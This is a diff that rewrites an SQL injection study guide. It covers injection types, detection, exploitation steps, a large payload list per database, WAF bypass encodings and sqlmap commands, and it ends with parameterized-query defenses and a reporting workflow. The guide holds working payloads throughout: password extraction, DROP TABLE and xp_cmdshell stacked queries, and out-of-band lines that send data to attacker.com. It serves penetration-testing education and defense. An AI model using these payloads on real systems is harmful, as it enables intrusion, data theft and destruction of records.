@@ -1,132 +1,387 @@
 
-=> SQL Injection
+================================================================================
 
-- SQL Injection (SQLi) is a web security vulnerability in which an attacker exploits flaws in an application by injecting malicious SQL (Structured Query Language) code into input fields. This can allow the attacker to interfere with the application's database queries, enabling unauthorized access to view, modify, or delete sensitive data.
-- SQL Injection occurs when user input is not properly validated or sanitized and is directly inserted into a SQL query. Since most web applications interact with databases using SQL, improperly handled input can allow attackers to craft malicious input that alters the intended structure and behavior of the query.
-- SQL Injection (SQLi) can have severe consequences, enabling attackers to:
-    - Bypass authentication mechanisms
-    - View sensitive data (e.g., usernames, passwords, personal information)
-    - Modify or delete database records
-    - Execute administrative operations on the database
-    - Extract entire databases
-    - In severe cases, gain control of the underlying server or system
-- Why SQL Injection Happens:
-    - Lack of Input Validation: User inputs are directly used in SQL queries without sanitization.
-    - Dynamic SQL Queries: Constructing SQL strings manually based on user input.
-    - Improper Use of APIs: Not using parameterized queries or ORM methods properly.
-    - Lack of Awareness or Security Practices: Developers not following secure coding standards.
+SQL INJECTION (SQLI)
 
-Types of SQLi:
-- In-Band SQLi: Attacker injects SQL and immediately sees results in the application’s response (e.g., input ' OR '1'='1 alters the query to always return true, bypassing authentication).
-    - Error-Based: Attacker causes database errors to gain information from error messages (e.g., injecting ' UNION SELECT NULL, version() -- reveals the database version through an error).
-    - Union-Based: Attacker uses the SQL UNION operator to combine results from the original query with malicious query results, retrieving data directly (e.g., ' UNION SELECT username, password FROM users -- appends user data to the query output).
-- Blind SQLi: No direct output; attacker infers data by observing application behavior (e.g., using true/false queries to check if the first letter of username is ‘A’, with different page responses).
-    - Boolean-Based: Uses conditional queries causing different responses based on true/false evaluation (e.g., username = 'admin' AND 1=1 returns a normal page, while username = 'admin' AND 1=0 causes an error or different behavior).
-    - Time-Based: Uses delays to determine if conditions are true by measuring server response times (e.g., query causes a 5-second delay if the first password character is ‘a’).
-- Out-of-Band SQLi: When direct or blind injection isn’t possible, attacker uses external channels like DNS or HTTP requests to receive data (e.g., database triggers a DNS lookup to attacker’s server, leaking data externally).
+================================================================================
 
-Impact of SQL Injection:
-- Data Theft (PII, credentials, financial info)
-- Account takeover
-- Website defacement
-- Complete system compromise (in some cases)
-- Regulatory penalties (e.g., under GDPR)
+1. WHAT IS SQL INJECTION
 
-Mitigate SQL Injection:
-- Use Prepared Statements (Parameterized Queries): To ensure user input is treated as data, not code.
-- Use ORM (Object Relational Mapping) Tools: Tools like Sequelize, Django ORM, Hibernate manage SQL safely.
-- Input Validation and Sanitization: Validate and sanitize all inputs through input validation and escaping.
-- Whitelist Input Validation: Only allow expected characters and patterns (e.g., for email, phone numbers).
-- Escape User Input Carefully: If you must use dynamic SQL, escape input correctly (not recommended over parameterized queries).
-- Limit Database Privileges (Principle of least privilege): The application’s DB user should have only necessary permissions (e.g., read-only where needed).
-- Error Handling: Don’t expose database errors to users (disable detailed DB error messages in production).
-- Use Web Application Firewalls (WAFs): Can block known attack signatures and patterns.
-- Regular Security Testing: Perform vulnerability scans, code audits, and pen-tests.
+- SQL Injection (SQLi) is a web security vulnerability in which an attacker exploits flaws in an application by injecting malicious SQL (Structured Query Language) code into input fields.
+- This can allow the attacker to interfere with the application's database queries, enabling unauthorized access to view, modify, or delete sensitive data.
+- SQL Injection occurs when user input is not properly validated or sanitized and is directly inserted into a SQL query.
+- Since most web applications interact with databases using SQL, improperly handled input can allow attackers to craft malicious input that alters the intended structure and behavior of the query.
 
-Detect SQLi Vulnerabilities:
-- You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:
-- The single quote character ' and look for errors or other anomalies.
-- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
-- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
-- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
-- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
+Why SQL Injection Happens:
 
-SQL injection in different parts of the query:
-- Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query. Most experienced testers are familiar with this type of SQL injection.
-- In UPDATE statements, within the updated values or the WHERE clause.
-- In INSERT statements, within the inserted values.
-- In SELECT statements, within the table or column name.
-- In SELECT statements, within the ORDER BY clause.
+- Lack of input validation: user inputs are directly used in SQL queries without sanitization.
+- Dynamic SQL queries: constructing SQL strings manually based on user input.
+- Improper use of APIs: not using parameterized queries or ORM methods properly.
+- Lack of awareness or security practices: developers not following secure coding standards.
 
-SQLi Payloads:
+Potential Impact of SQL Injection:
+
+- Bypass authentication mechanisms
+- View sensitive data (usernames, passwords, personal information)
+- Modify or delete database records
+- Execute administrative operations on the database
+- Extract entire databases
+- In severe cases, gain control of the underlying server or system
+
+================================================================================
+
+2. TYPES OF SQL INJECTION
+
+2.1 In-Band SQLi (Classic)
+
+The attacker injects SQL and immediately sees results in the application's response.
+
+- Error-Based SQLi: The attacker causes database errors to gain information from error messages. For example, injecting ' UNION SELECT NULL, version() -- reveals the database version through an error.
+
+- Union-Based SQLi: The attacker uses the SQL UNION operator to combine results from the original query with malicious query results, retrieving data directly. For example, ' UNION SELECT username, password FROM users -- appends user data to the query output.
+
+2.2 Blind SQLi
+
+No direct output; the attacker infers data by observing application behavior.
+
+- Boolean-Based Blind SQLi: Uses conditional queries that cause different responses based on true/false evaluation. For example, username = 'admin' AND 1=1 returns a normal page, while username = 'admin' AND 1=0 causes an error or different behavior.
+
+- Time-Based Blind SQLi: Uses delays to determine if conditions are true by measuring server response times. For example, a query causes a 5-second delay if the first password character is 'a'.
+
+2.3 Out-of-Band (OOB) SQLi
+
+When direct or blind injection is not possible, the attacker uses external channels like DNS or HTTP requests to receive data. For example, the database triggers a DNS lookup to the attacker's server, leaking data externally.
+
+2.4 Second-Order SQLi
+
+The payload is stored (e.g., via registration or profile update) and later executed when the stored data is used in another SQL query. Example: register username "admin'-- -", then later an administrator views the user list and the payload triggers.
+
+================================================================================
+
+3. DETECTING SQL INJECTION VULNERABILITIES
+
+You can detect SQL injection manually using a systematic set of tests against every entry point in the application. Entry points include:
+
+- URL parameters (e.g., ?id=1, ?page=2)
+- POST data (forms, login, search)
+- HTTP headers (User-Agent, Referer, Cookie, X-Forwarded-For)
+- JSON or XML fields
+
+Manual Testing Steps:
+
+3.1 Initial Detection
+
+- Submit the single quote character ' and look for errors or other anomalies.
+- Submit SQL-specific syntax that evaluates to the base (original) value and to a different value, looking for systematic differences. Example: AND 1=1 vs AND 1=2.
+- Submit boolean conditions such as OR 1=1 and OR 1=2.
+- Submit payloads designed to trigger time delays when executed within a SQL query (e.g., SLEEP(5) or WAITFOR DELAY).
+- Submit OAST payloads designed to trigger an out-of-band network interaction (DNS/HTTP) and monitor for interactions.
+
+3.2 Specific Manual Tests
+
+- Single quote test: http://example.com/page?id=1' -> if error message appears (e.g., "You have an error in your SQL syntax"), likely vulnerable.
+- Logic test: http://example.com/page?id=1 AND 1=1 -> normal response; http://example.com/page?id=1 AND 1=2 -> different response (blank page, missing content, redirect). If responses differ, parameter is injectable.
+- Comment test: http://example.com/page?id=1' -- - (space after --). If page loads without errors, original query was altered.
+
+3.3 Determine Injection Type
+
+- If error messages reveal data: Error-based.
+- If UNION SELECT works and output is visible: Union-based.
+- If page changes based on true/false conditions but no data output: Boolean-based blind.
+- If response time changes with SLEEP() functions: Time-based blind.
+- If you can trigger DNS/HTTP requests: Out-of-band.
+
+3.4 Automated Tool Testing
+
+SQLMap (Most Common)
+
+- Basic scan: sqlmap -u "http://example.com/page?id=1" --batch
+- Enumerate databases: sqlmap -u "http://example.com/page?id=1" --dbs
+- Enumerate tables (from a specific database): sqlmap -u "http://example.com/page?id=1" -D database_name --tables
+- Enumerate columns: sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --columns
+- Dump data: sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name -C column1,column2 --dump
+- POST data: sqlmap -u "http://example.com/login" --data="user=admin&pass=123" --dump
+- Advanced options: --level=5 (increase depth), --risk=3 (include aggressive payloads), --os-shell (attempt OS command execution)
+
+Other Tools: Burp Suite (Intruder, Scanner), OWASP ZAP (active scanner), jSQL Injection (GUI).
+
+================================================================================
+
+4. EXPLOITATION STEPS (IF VULNERABLE)
+
+Once a vulnerability is confirmed, follow this structured process.
+
+4.1 Determine Database Type
+
+Different databases have different syntax. Clues from error messages or version functions:
+
+- MySQL: VERSION(), @@version
+- MSSQL: @@VERSION
+- PostgreSQL: version()
+- Oracle: SELECT banner FROM v$version
+
+4.2 Determine Number of Columns (for Union-based)
+
+- Use ORDER BY: ' ORDER BY 1-- -, ' ORDER BY 2-- -, increase until error. The last valid number is the column count.
+- Or use UNION SELECT NULL, NULL, ... until no error.
+
+4.3 Find Columns with String Data Type (Union-based)
+
+Submit a series of UNION SELECT payloads placing a string value into each column in turn. For example, if four columns:
+
+' UNION SELECT 'a',NULL,NULL,NULL-- -
+' UNION SELECT NULL,'a',NULL,NULL-- -
+' UNION SELECT NULL,NULL,'a',NULL-- -
+' UNION SELECT NULL,NULL,NULL,'a'-- -
+
+4.4 Enumerate Database Schema
+
+- List databases (MySQL): ' UNION SELECT schema_name FROM information_schema.schemata -- -
+- List tables: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database_name' -- -
+- List columns: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -
+
+4.5 Extract Data
+
+- Union-based: ' UNION SELECT username, password FROM users -- -
+- Combine multiple values in one column: ' UNION SELECT username || '~' || password FROM users -- -
+
+4.6 Blind SQL Injection Exploitation
+
+Boolean-based blind: Use conditional queries that change the page response.
+
+- Confirm table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a
+- Confirm user exists: ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+- Determine password length: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a (iterate length until false)
+- Extract character by character: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a (use Burp Intruder to brute force each position)
+
+Time-based blind: Use delays to infer conditions.
+
+- MySQL: ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
+- MSSQL: '; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:5'-- -
+- PostgreSQL: ' AND CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' THEN pg_sleep(5) ELSE 0 END-- -
+- Oracle: ' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN dbms_pipe.receive_message('x',5) ELSE NULL END FROM users WHERE username='administrator') IS NULL-- -
+
+Error-based blind (conditional errors): Use CASE to cause division by zero.
+
+- xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a (error, condition true)
+- xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a (no error, false)
+- Extract data via CAST(): ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- - (error leaks username)
+
+Out-of-band (OOB) exfiltration:
+
+- MySQL: ' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -
+- MSSQL: '; DECLARE @h varchar(8000); SET @h='\\attacker.com\share\'+db_name()+'.txt'; EXEC master..xp_dirtree @h-- -
+- Oracle: ' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -
+- PostgreSQL: ' AND (SELECT copy((SELECT current_database()) to '/tmp/x')) IS NULL-- - (requires file permissions)
+
+4.7 Stacked Queries (Execute multiple statements)
+
+'; DROP TABLE users-- -
+'; EXEC xp_cmdshell 'dir'-- - (MSSQL)
+'; INSERT INTO users VALUES('hacker','pass')-- - (if INSERT allowed)
+
+================================================================================
+
+5. SQL INJECTION PAYLOADS (BY TYPE)
+
+5.1 Error-Based Payloads
+
+' (single quote) triggers syntax error.
+
+' AND extractvalue(1,concat(0x7e,database()))-- - (MySQL) reveals database name in error.
+
+' AND updatexml(1,concat(0x7e,version()),1)-- - (MySQL) reveals version.
+
+' AND 1=convert(int,@@version)-- - (MSSQL) reveals SQL Server version.
+
+' AND 1=cast(version() as int)-- - (PostgreSQL) reveals version.
+
+' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- - (Oracle) reveals banner.
+
+5.2 Union-Based Payloads
+
+Determine column count: ' ORDER BY 1-- - ... ' ORDER BY N-- - until error.
+
+' UNION SELECT NULL, NULL, NULL-- - (adjust number of NULLs until no error).
+
+' UNION SELECT 1,2,3-- - (replace NULLs with numbers to see which columns are displayed).
+
+' UNION SELECT 1,2,database()-- - (retrieve database name).
+
+' UNION SELECT 1,2,table_name FROM information_schema.tables-- -
+
+' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -
+
+' UNION SELECT username, password FROM users-- -
+
+' UNION SELECT username || '~' || password FROM users-- - (combine multiple values in one column).
+
+5.3 Boolean-Based Blind Payloads
+
+' AND 1=1-- - (true condition, normal page)
+
+' AND 1=2-- - (false condition, page may be empty or different)
+
+' AND SUBSTRING(database(),1,1)='a'-- - (check first character of database name)
+
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1-- - (extract password characters)
+
+5.4 Time-Based Blind Payloads
+
+MySQL: ' AND IF(1=1, SLEEP(5), 0)-- - (delay 5 seconds)
+
+MySQL with condition: ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
+
+MSSQL: '; WAITFOR DELAY '0:0:5'-- -
+
+MSSQL with condition: '; IF (SELECT SUBSTRING(db_name(),1,1))='a' WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'-- -
+
+PostgreSQL: ' AND (SELECT pg_sleep(5))-- -
+
+PostgreSQL with condition: ' AND CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) ELSE 0 END-- -
+
+Oracle: ' AND (SELECT dbms_pipe.receive_message('x',5) FROM dual) IS NULL-- -
+
+5.5 Out-of-Band Payloads
+
+MySQL: ' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -
+
+MSSQL: '; DECLARE @h varchar(8000); SET @h='\\attacker.com\share\'+db_name()+'.txt'; EXEC master..xp_dirtree @h-- -
+
+Oracle: ' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -
+
+PostgreSQL: ' AND (SELECT copy((SELECT current_database()) to '/tmp/x')) IS NULL-- - (requires file permissions)
+
+5.6 Stacked Queries Payloads
+
+MySQL: '; DROP TABLE users-- -
+
+MySQL: '; SELECT * FROM users INTO OUTFILE '/tmp/out.txt'-- -
+
+MSSQL: '; EXEC xp_cmdshell 'dir'-- -
+
+PostgreSQL: '; CREATE TABLE test (id int);-- -
+
+Oracle: '; BEGIN DBMS_OUTPUT.PUT_LINE('test'); END;-- -
+
+5.7 WAF Bypass and Encoding Variations
+
+- URL encoding: %27%20AND%201%3D1--%20-
+- Double URL encoding: %2527%2520AND%25201%253D1--%2520-
+- Case variation: ' aNd 1=1-- -
+- Comments: '/**/AND/**/1=1-- -
+- Inline MySQL comments: '/*!50000AND*/ 1=1-- -
+- Hex encoding: 0x2720414e4420313d31 (which is ' AND 1=1)
+- Concatenation: ' AND 'a'='a'
+
+5.8 Basic Detection Payloads
+
 - Skipping further query by commenting: Abcd'--
 - Skipping all conditions: Abcd'+OR+1=1--
 - Bypass login with username: user'--
 
-In-Band SQLi - UNION:
-- Key requirements for UNION query to work:
-    - The individual queries must return the same number of columns
-    - The data types in each column must be compatible between the individual queries
-- We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
-- Determining the number of columns required:
-    - Injecting series of ORDER BY clauses and incrementing the specified column index until an error occurs (out of range of the number): ' ORDER BY 1--
-    - Submitting series of UNION SELECT payloads specifying a different number of null values: ' UNION SELECT NULL,NULL--
-- Finding columns with a useful data type:
-    - After determining the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
-    - ' UNION SELECT 'a',NULL,NULL,NULL--
-    - ' UNION SELECT NULL,'a',NULL,NULL--
-    - ' UNION SELECT NULL,NULL,'a',NULL--
-    - ' UNION SELECT NULL,NULL,NULL,'a'--
-- UNION attack, retrieving data from other tables: ' UNION SELECT username, password FROM users--
-- Retrieving multiple values within single column: ' UNION SELECT username || '~' || password FROM users--
-- Examining the database:
-    - Querying the database type and version: ' UNION SELECT @@version--
-        - Microsoft, MySQL: SELECT @@version
-        - Oracle: SELECT banner FROM v$version
-        - PostgreSQL: SELECT version()
-- Listing the contents of the database:
-    - Query information_schema.tables view to list the tables in the database:
-        - ' UNION SELECT * FROM information_schema.tables
-        - ' UNION SELECT table_name, NULL FROM information_schema.tables--
-    - Query information_schema.columns to list the columns in individual tables:
-        - ' UNION SELECT * FROM information_schema.columns WHERE table_name = 'Users'
-        - ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
-    - Retrieve the columns from the table:
-        - ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+================================================================================
 
-Blind SQLi:
-- Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
-- Exploiting blind SQL injection by triggering conditional responses:
-    - With true: ' AND '1'='1
-    - With false: ' AND '1'='2
-    - Veriry/confirm table user: ' AND (SELECT 'a' FROM users LIMIT 1)='a
-    - Confirm user administrator exist in users table/column: ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-    - Determine how many characters are in the password of the administrator user and test different password lengths:
-        - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
-        - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
-        - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
-    - Test the character at each position to determine its value (Intruder): ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+6. SQL INJECTION IN DIFFERENT PARTS OF THE QUERY
 
-Blind - Error-based SQLi:
-- Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger.
-- Exploiting blind SQL injection by triggering conditional errors:
-    - xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
-    - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
-- Extracting sensitive data via verbose SQL error messages:
-    - CAST() function: CAST((SELECT example_column FROM example_table) AS int)
-    - An error-based SQL injection using the TrackingId cookie. Initially, appending a single quote reveals a verbose SQL error confirming the injection point: TrackingId=ogAZZfxtOKUELbuJ'
-    - To fix the broken query, SQL comment characters are added: TrackingId=ogAZZfxtOKUELbuJ'--
-    - Then, a basic payload is tested to confirm injection by using a CAST: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
-    - The error response guides a fix: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
-    Next, the payload tries to extract data: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
-    Due to truncation, the cookie value is shortened: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
-    - It fails due to multiple rows, so a LIMIT 1 is added: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-    - This leaks the first username: "administrator". The final step retrieves the password: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query.
 
-Blind - Time-based SQLi:
-- When SQL errors are handled gracefully and no error messages are shown, blind SQL injection can be exploited using time-based delays. By injecting conditions that cause deliberate delays (e.g., using SLEEP()), attackers can infer whether a condition is true or false based on the time taken for the HTTP response.
-- Exploiting blind SQL injection by triggering time delays:
-    - The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server:
-    - The first of these inputs does not trigger a delay, because the condition 1=2 is false: '; IF (1=2) WAITFOR DELAY '0:0:10'--
-    - The second input triggers a delay of 10 seconds, because the condition 1=1 is true: '; IF (1=1) WAITFOR DELAY '0:0:10'--
-    - Retrieve data by testing one character at a time: '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+- In UPDATE statements, within the updated values or the WHERE clause.
+- In INSERT statements, within the inserted values.
+- In SELECT statements, within the table or column name (rare, requires whitelist bypass).
+- In SELECT statements, within the ORDER BY clause (e.g., ?sort=price').
+
+================================================================================
+
+7. PARAMETERIZED QUERIES / PREPARED STATEMENTS (THE MAIN DEFENSE)
+
+What are Parameterized Queries?
+
+Parameterized queries (also called prepared statements) are a coding technique that separates SQL logic from the data being passed to the database. Instead of building a SQL query by concatenating user input into a string, you define the query with placeholders (parameters), then supply the data separately. The database treats the parameters as data only, never as executable code.
+
+How It Works:
+
+1. Prepare: The database receives the SQL statement with placeholders (e.g., ? or :name). It parses, compiles, and optimizes the query structure once.
+
+2. Execute: The application sends the actual values (parameters) to the database. The database plugs them into the prepared query without re-interpreting them as SQL.
+
+Because the query structure is fixed before the parameters arrive, any malicious input (like ' OR '1'='1) cannot change the intended SQL logic. It is treated as a literal string value.
+
+Examples:
+
+PHP (PDO) - Unsafe: $stmt = $pdo->query("SELECT * FROM users WHERE username = '$user'");
+PHP (PDO) - Safe (parameterized): $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $_POST['username']]);
+
+Python (psycopg2) - Unsafe: cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
+Python - Safe: cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+Java (JDBC) - Unsafe: Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE username = '" + username + "'");
+Java - Safe: PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?"); pstmt.setString(1, username); ResultSet rs = pstmt.executeQuery();
+
+Why It Prevents SQL Injection:
+
+- Separation of code and data: The database engine knows the structure (e.g., WHERE username = ?) is fixed. The parameter is bound as a value, not as part of the SQL statement.
+- Automatic escaping: The database driver handles escaping internally, but more importantly, the parameter never becomes executable SQL.
+- No risk of quote manipulation: Even if the input contains SQL syntax, it is sent as raw data (e.g., a string containing ' OR '1'='1 will be interpreted as that exact string, not as a SQL condition).
+
+Common Misconceptions:
+
+- Escaping is not the same as parameterization. Functions like mysqli_real_escape_string() only sanitize strings; they do not prevent injection in other parts of the query (e.g., table names, ORDER BY columns). Parameterized queries protect all data values.
+- Stored procedures can still be vulnerable if you build dynamic SQL inside them using string concatenation. Parameterized calls to stored procedures are safe.
+- Many ORMs (like Hibernate, Entity Framework) use parameterized queries under the hood, but only if you use their safe APIs (not concatenating raw SQL).
+
+Best Practices:
+
+- Use parameterized queries for all user-supplied data, including data from cookies, headers, and hidden form fields.
+- For dynamic identifiers (table/column names), use whitelisting - never accept raw user input for these.
+- Combine with least privilege: the database account used by the application should only have necessary permissions (e.g., SELECT on specific tables, no DROP).
+
+================================================================================
+
+8. MITIGATION AND PREVENTION
+
+Primary Defenses:
+
+- Use Prepared Statements (Parameterized Queries): Ensures user input is treated as data, not code. This is the most reliable defense.
+- Use ORM (Object Relational Mapping) Tools: Tools like Sequelize, Django ORM, Hibernate manage SQL safely and often use parameterization automatically.
+- Input Validation and Sanitization: Validate and sanitize all inputs through input validation and escaping. Whitelist input validation: only allow expected characters and patterns (e.g., for email, phone numbers).
+- Escape User Input Carefully: If you must use dynamic SQL (not recommended over parameterized queries), escape input correctly using database-specific escaping functions (e.g., mysqli_real_escape_string). However, parameterized queries are strongly preferred.
+
+Additional Protections:
+
+- Limit Database Privileges (Principle of Least Privilege): The application's database user should have only necessary permissions (e.g., read-only where needed). Do not use a database administrator account for the web application.
+- Proper Error Handling: Do not expose database errors to users. Disable detailed DB error messages in production. Use custom error pages.
+- Use Web Application Firewalls (WAFs): Can block known attack signatures and patterns, providing an additional layer of defense.
+- Regular Security Testing: Perform vulnerability scans, code audits, and penetration tests. Use both manual and automated testing (e.g., SQLMap, Burp Suite) to identify and fix SQLi flaws.
+
+================================================================================
+
+9. COMPLETE TESTING WORKFLOW (SUMMARY)
+
+Step 1: Identify all input vectors - GET parameters, POST data, HTTP headers, cookies, JSON/XML fields.
+
+Step 2: Submit a single quote ' and observe errors or anomalies.
+
+Step 3: Test boolean conditions: AND 1=1 vs AND 1=2, look for differences in responses.
+
+Step 4: Introduce time delays (e.g., SLEEP(5)) to detect time-based blind injection.
+
+Step 5: Submit OAST payloads (e.g., DNS lookup) to detect out-of-band injection.
+
+Step 6: Determine injection type based on responses: error-based, union-based, boolean-based blind, time-based blind, or OOB.
+
+Step 7: If union-based, determine number of columns using ORDER BY or UNION SELECT NULL.
+
+Step 8: Find columns with string data type by injecting 'a' into each column.
+
+Step 9: Enumerate database schema: list databases, tables, columns using information_schema (or equivalent).
+
+Step 10: Extract data from interesting tables (e.g., users, passwords).
+
+Step 11: For blind SQLi, use conditional queries (boolean or time) to extract data character by character.
+
+Step 12: Use SQLMap for automated enumeration and data extraction (if permitted).
+
+Step 13: Document findings, including vulnerable parameters, injection type, extracted data, and remediation recommendations.
+
+Step 14: Report to development team with fixes: parameterized queries, input validation, least privilege, error handling.
